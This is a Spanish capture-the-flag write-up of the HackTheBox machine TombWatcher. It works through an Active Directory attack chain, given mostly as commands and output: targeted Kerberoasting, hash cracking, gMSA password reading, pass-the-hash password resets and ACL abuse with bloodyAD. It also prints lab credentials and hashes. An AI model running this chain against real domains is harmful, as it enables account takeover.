Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #certipy #acl #bloodhound #bloodyad #ESC15 #ESC3 #ad #certificates #gMSA #targeted-kerberoast

![](assets/Pasted%20image%2020260106224806.png)

Credenciales iniciales:  henry / H3nry_987TGV!
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~]
└─$ ping -c 1 10.129.232.167
PING 10.129.232.167 (10.129.232.167) 56(84) bytes of data.
64 bytes from 10.129.232.167: icmp_seq=1 ttl=127 time=100 ms

--- 10.129.232.167 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 100.022/100.022/100.022/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.232.167 -oG nmap/allPorts

Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127
49716/tcp open  unknown          syn-ack ttl 127
49732/tcp open  unknown          syn-ack ttl 127
49766/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts predeterminados.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49695,49696,49698,49716,49732,49766 -sV -sC -Pn -n -vvv -sS 10.129.232.167 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-07 09:17:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-07T09:19:27+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| <MAS...>
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-07T09:19:26+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| <MAS..>
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-07T09:19:27+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| <MAS....>
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
|<MAS....>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-01-07T09:19:26+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49732/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49766/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s
| smb2-time:
|   date: 2026-01-07T09:18:47
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 52925/tcp): CLEAN (Timeout)
|   Check 2 (port 10440/tcp): CLEAN (Timeout)
|   Check 3 (port 60904/udp): CLEAN (Timeout)
|   Check 4 (port 34102/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

Vemos bastantes puertos abiertos entre ellos:

- Puerto 80 HTTP
- Microsoft IIS httpd 10.0
- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139 y 445 SMB
- Puerto 389 y 663 LDAP que nos indica el dominio **tombwatcher.htb** y el nombre de la maquina **DC01**
- Puerto 5985 WinRm


Meteremos el dominio al /etc/hosts

```bash
10.129.232.167 tombwatcher.htb DC01 DC01.tombwatcher.htb
```
## Enumeración

### Puerto 139, 445 SMB

Saque informacion general de la maquina.

- Corre un Windows 10 Server 2019
- Dominio **tombwatcher.htb** y nombre de la maquina **DC01**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ nxc smb 10.129.232.167

SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
```

Enumere los shares a los que tengo acceso con mis credenciales iniciales:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ nxc smb 10.129.232.167 -u 'henry' -p 'H3nry_987TGV!' --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share
```

- Estos son shares standard de AD, nada raro.

### Puerto 135 RPC

Enumere usuarios via rpc.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ rpcclient -U 'tombwatcher.htb/henry' 10.129.232.167
Password for [TOMBWATCHER.HTB\henry]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Henry] rid:[0x44f]
user:[Alfred] rid:[0x450]
user:[sam] rid:[0x451]
user:[john] rid:[0x452]
```

## Intrusion y Movimiento Lateral.


Sin mucha mas informacion decido utilizar `bloodhound`

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

El primer paso es utilizar un **Ingestor** que se va a encargar de recopilar toda la informacion del dominio. En este caso utilice `bloodhound-python`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher/content]
└─$ bloodhound-python -c All -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.129.232.167 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::a7e9:ad14:eb5d:1abe
INFO: Trying LDAP connection to dead:beef::a7e9:ad14:eb5d:1abe
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::a7e9:ad14:eb5d:1abe
INFO: Trying LDAP connection to dead:beef::a7e9:ad14:eb5d:1abe
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 18S
INFO: Compressing output into 20260107054019_bloodhound.zip

┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher/content]
└─$ ls
20260107054019_bloodhound.zip
```

- Esto nos generara un ZIP el cual podremos importar en `bloodhound`.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ bloodhound
```

Ejecute bloodhound e importe el zip.

- Jugando con los Outbound objects pude encontrar esta path para moverme lateralmente al usuario **john.** **john** tiene permisos GenericAll sobre el ACDS.

![](assets/Pasted%20image%2020260107230636.png)



### WriteSPN sobre el usuario Alfred

- Lo primero que veo es que mi usuario **henry** tiene el permiso **WriteSPN** sobre el usuario **alfred.**

![](assets/Pasted%20image%2020260106234528.png)

Este permiso **WriteSPN** nos permite realizar un ataque Targeted Kerberoast que consiste en:

- Asignar un SPN falso al usuario **alfred**
- Solicitar un TGS para dicho servicio y obtener un hash Kerberos crackeable

```bash
┌──(venv)─(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ sudo ntpdate 10.129.232.167
[sudo] password for wndr:
2026-01-07 09:48:32.724084 (+0000) +14400.998369 +/- 0.044730 10.129.232.167 s1 no-leap
CLOCK: time stepped by 14400.998369

┌──(venv)─(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$88ed3a794980dd991765149a9a99e5bc$c392237d213d62e4b262f05747b342f7021f6c8f00fe4759cad333e846c5c0f4884d68b5463b8724d1539b5083fedea8586b073ecc2829d671e3f1f418f1f73254df436e6022d471da2887b86ce47fb824e11f41698db3f4a764879e30bd0bd01ee0a1637e670672e09e9fcb83c1599855e96e31bbf1f536ca939b10ba46cb2735acdfa9dd5a58d8a70ba68490aadd765fd75b4fe51b7274bd26a9e3b0c5870207723fe282055a213d8f83ea7fce7a7cd68fc143106c0ab0c778722d6bdfbed91338ba4c121c683f38ce2d4dfbee50f49b2efaa6b7e90941490d1aeaf7552486afc10879ca8d3e8ec13b2599f47fdf10b4f9264f56353421c379da888a8dbe1d7f3cfec96daf2fa7b4b1e9d5cf30a9ae0f969f5844369b40c5a06b87162004740b2a4bbda607f69d0c5b0e9c42995e91adb5ad89c6af86879d099fb23135fd0a9d35d7cee847c7919efdfbf9b28ac8c27d4a68fd7dfb9f30616c4ccbb5b694374ea2e1c67263d78f20fa5223caee4f2f92e477bba3cf7aa3ebc704b290a4b5c9e872b7775373ab4d35a4d5562bb30276c72ddbbd915d17970c921df7a1dabe88fee9b05311a628baa9e9bb6614706e6904b85974e6f2c447d1bc068dfbdd2655466c5760eadff5d5045b280565e9cc10e364ef1389c378fd5012d65ed72fa6c57be428b48f1a10645fdcff3aaf48977deeacc9a8c6798487a54e7055e64360b87df995a39ca3a75f4b3964f1748c92a4138c04447b1f6781eb6beb4afa04de8bbabbdd8d3e690e35f668eaaa8802a1298f8a9460ac00409f552deedae1694d75a3df652204500e6359dd956ba1aea4ea417411bda104575cac06e411022b4d79ad5378643d57571e6974e4e2ed002cfccd199e6cdc7e3267dfa012886a95099a9ca5c8f4d7ad15f26ba4ce3cf51733f60b802a5a3388a4c7beff981e229fa102a162601cf87afc8848bda3a325f57aba0b4c2abee64b8bfbc29e9dd2f5301c31e6ce8c5a410a6a8d75d645f5e37c4050a73403e7a51314484d9c837467b38081778665e713ccf5c621f3aa53f232f77035bcb0bbff4766a2b9bc33cdd484261e9ffce4e5a47ec3822f8f1a77baca4f577d05bc7ba8e7add044752d68383428396b1015fa0d78ed9e7df82b8fc0e41e81094b2eb0e592ac518a3d0ca5c7ae3f6bbd301c6ce1aacc1ad92d67fdac8cf4e82744f326490075c13ad52fa5dc7a82b30f5680da76789220e274fba57870dbaaaff0880b2eeb553cfa6651c4ac74119e6a8ce191b0f5cebf7d205e63312fbe1023e3bffc8905600aef82db3848ef8fcfe3b753ecf6525d5d353c082a12d560d27aadc4d007f7276bc43c532ac8eba6d4e96ad576f39f69aa52f8c75d64e208191c783d081ac778cca58f84391a5b904f6b5232b36a1d3c3a6fcefa0b146b3fd5db1fe2e5ba0bf12e280d07cc5fd66d5b4c2e123f559fa8a959ce8aed1b4978f1af95e2261d
[VERBOSE] SPN removed successfully for (Alfred)
```

- Esto nos genera un hash kerberos crackeable.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher/loot]
└─$ sudo hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$88ed3a794980dd991765149a9a99e5bc$c392237d213d62e4b262f05747b342f7021f6c8f00fe4759cad333e846c5c0f4884d68b5463b8724d1539b5083fedea8586b073ecc2829d671e3f1f418f1f73254df436e6022d471da2887b86ce47fb824e11f41698db3f4a764879e30bd0bd01ee0a1637e670672e09e9fcb83c1599855e96e31bbf1f536ca939b10ba46cb2735acdfa9dd5a58d8a70ba68490aadd765fd75b4fe51b7274bd26a9e3b0c5870207723fe282055a213d8f83ea7fce7a7cd68fc143106c0ab0c778722d6bdfbed91338ba4c121c683f38ce2d4dfbee50f49b2efaa6b7e90941490d1aeaf7552486afc10879ca8d3e8ec13b2599f47fdf10b4f9264f56353421c379da888a8dbe1d7f3cfec96daf2fa7b4b1e9d5cf30a9ae0f969f5844369b40c5a06b87162004740b2a4bbda607f69d0c5b0e9c42995e91adb5ad89c6af86879d099fb23135fd0a9d35d7cee847c7919efdfbf9b28ac8c27d4a68fd7dfb9f30616c4ccbb5b694374ea2e1c67263d78f20fa5223caee4f2f92e477bba3cf7aa3ebc704b290a4b5c9e872b7775373ab4d35a4d5562bb30276c72ddbbd915d17970c921df7a1dabe88fee9b05311a628baa9e9bb6614706e6904b85974e6f2c447d1bc068dfbdd2655466c5760eadff5d5045b280565e9cc10e364ef1389c378fd5012d65ed72fa6c57be428b48f1a10645fdcff3aaf48977deeacc9a8c6798487a54e7055e64360b87df995a39ca3a75f4b3964f1748c92a4138c04447b1f6781eb6beb4afa04de8bbabbdd8d3e690e35f668eaaa8802a1298f8a9460ac00409f552deedae1694d75a3df652204500e6359dd956ba1aea4ea417411bda104575cac06e411022b4d79ad5378643d57571e6974e4e2ed002cfccd199e6cdc7e3267dfa012886a95099a9ca5c8f4d7ad15f26ba4ce3cf51733f60b802a5a3388a4c7beff981e229fa102a162601cf87afc8848bda3a325f57aba0b4c2abee64b8bfbc29e9dd2f5301c31e6ce8c5a410a6a8d75d645f5e37c4050a73403e7a51314484d9c837467b38081778665e713ccf5c621f3aa53f232f77035bcb0bbff4766a2b9bc33cdd484261e9ffce4e5a47ec3822f8f1a77baca4f577d05bc7ba8e7add044752d68383428396b1015fa0d78ed9e7df82b8fc0e41e81094b2eb0e592ac518a3d0ca5c7ae3f6bbd301c6ce1aacc1ad92d67fdac8cf4e82744f326490075c13ad52fa5dc7a82b30f5680da76789220e274fba57870dbaaaff0880b2eeb553cfa6651c4ac74119e6a8ce191b0f5cebf7d205e63312fbe1023e3bffc8905600aef82db3848ef8fcfe3b753ecf6525d5d353c082a12d560d27aadc4d007f7276bc43c532ac8eba6d4e96ad576f39f69aa52f8c75d64e208191c783d081ac778cca58f84391a5b904f6b5232b36a1d3c3a6fcefa0b146b3fd5db1fe2e5ba0bf12e280d07cc5fd66d5b4c2e123f559fa8a959ce8aed1b4978f1af95e2261d

:basketball
```

- credenciales alfred / basketball.

### AddSelf sobre el grupo Infrastructure

Ahora que tenemos acceso al usuario **alfred** podemos ver en bloodhound lo siguiente.

- **alfred** tiene el permiso **AddSelf** sobre el grupo **Infrastructure**

![](assets/Pasted%20image%2020260106235436.png)

Podemos abusar del derecho **AddSelf** para que meter a alfred al grupo de **Infrastructure** con`bloodyad`

```bash
┌──(venv)─(wndr㉿wndr)-[~/Tools/gMSADumper]
└─$ bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember Infrastructure alfred
[+] alfred added to Infrastructure
```

### ReadGMSA sobre ansible_dev$

Ahora que ya somos parte del group Infrastructure pasemos al siguiente nodo.

- El grupo **Infrastructure** tiene el permiso **ReadGMSAPassword** sobre la cuenta de maquina **ansible_dev$**

![](assets/Pasted%20image%2020260107000402.png)

Vamos a abusar del derecho **ReadGMSAPassword**.

- Esto nos permite leer la contraseña de un gMSA (Group Managed Service Account) usada por servicios como IIS, SQL y en este caso ANSIBLE_DEV.

Con netexec podemos realizar esto usando el modulo `--gmsa`

```bash
┌──(venv)─(wndr㉿wndr)-[~/Tools/gMSADumper]
└─$ netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAPS       10.129.232.167  636    DC01             [+] tombwatcher.htb\alfred:basketball
LDAPS       10.129.232.167  636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.232.167  636    DC01             Account: ansible_dev$         NTLM: 2669c6ff3a3d9c7472e358c7a792697b     PrincipalsAllowedToReadPassword: Infrastructure
```

- Tenemos el hash **ntlm** de la cuenta **ansible_dev$**

### ForceChangePassword sobre sam

Ahora podemos pasar al siguiente nodo.

- La cuenta de ANSIBLE tiene el derecho **Force Change Password** sobre el usuario Sam, lo cual nos va a permitir cambiar la contraseña de dicho usuario para tener acceso a el.

![](assets/Pasted%20image%2020260107001953.png)

Con `pth-net` vamos a realizar el ataque para cambiarle la contraseña al usuario sam y tener acceso a el.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Tools/gMSADumper]
└─$ pth-net rpc password "sam" "passwordsam" -U "tombwatcher.htb"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"2669c6ff3a3d9c7472e358c7a792697b" -S "tombwatcher.htb"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

Podemos comprobar si el cambio de contraseña funciono con `netexec`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ nxc smb 10.129.232.167 -u 'sam' -p 'passwordsam'
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\sam:passwordsam
```

- Funciono bien y ahora tenemos credenciales para el usuario sam / passwordsam

### WriteOwner sobre john.

Ahora podemos pasar al siguiente nodo.

- El usuario Sam tiene el derecho **WriteOwner** sobre le usuario **John** lo que nos permite indirectamente el control total del usuario.

![](assets/Pasted%20image%2020260107002717.png)

Para **abusar del permiso `WriteOwner`**, primero es necesario **tomar posesión del objeto objetivo**, asignándonos como **propietarios (owner)** del mismo.  
Una vez que somos propietarios, podremos otorgarnos permisos más elevados sobre el objeto..

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher/loot]
└─$ bloodyAD -d tombwatcher.htb -u sam -p 'passwordsam' --host dc01.tombwatcher.htb set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

Ahora nos vamos a otorgar el derecho **GenericAll** sobre el usuario **john** para tener control total sobre el usuario.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher/loot]
└─$ bloodyAD -d tombwatcher.htb -u sam -p 'passwordsam' --host tombwatcher.htb add genericAll john sam
[+] sam has now GenericAll on john
```

Una vez tenemos **GenericAll** sobre el usuario **john** hay distintas formas de aprovecharlo algunas de ellas seria realizar un Targeted Kerberoast Attack (el cual hice pero el hash de john no es crackeable), Shadow Credentials o cambiar directamente la password.

- Aqui cambiamos la contraseña del usuario john a passwordjohn

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher/loot]
└─$ net rpc password "john" "passwordjohn" -U "tombwatcher.htb"/"sam"%"passwordsam" -S "tombwatcher.htb"
```

- Con `netexec` podemos comprobar que las credenciales funcionan correctamente.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/tombwatcher]
└─$ nxc smb 10.129.232.167 -u 'john' -p 'passwordjohn'
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\john:passwordjohn
```

El usuario **john** pertenece al grupo **Remote Managment Users** por lo cual puedo conectarme via **WinRm** para tener acceso al sistema.

```bash
